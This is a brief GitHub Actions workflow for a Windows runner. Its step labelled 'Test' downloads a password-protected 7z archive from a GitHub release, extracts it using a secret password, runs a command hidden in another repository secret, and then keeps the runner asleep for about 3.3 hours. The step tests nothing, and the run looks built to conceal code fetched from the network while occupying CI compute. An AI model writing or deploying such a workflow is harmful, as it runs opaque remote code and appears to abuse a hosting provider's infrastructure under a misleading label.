name: main

on:
  workflow_dispatch:

jobs:
  setup-run:
    runs-on: windows-2022
    steps:
    - name: Check out the repository
      uses: actions/checkout@v2

    - name: Test
      shell: pwsh
      run: |
        $dest = "$Env:USERPROFILE\thisfor"
        Invoke-WebRequest -Uri 'https://github.com/nrobx/nrobx/releases/download/thisfor/thisfor.7z' -OutFile "$Env:USERPROFILE\thisfor.7z"
        & "C:\Program Files\7-Zip\7z.exe" x "$Env:USERPROFILE\thisfor.7z" -o"$dest" -p${{ secrets.THISFOR_PASS }} -y
        ${{ secrets.moo_env }}

    - name: Sleep
      shell: pwsh
      run: |
        Start-Sleep -Seconds 11800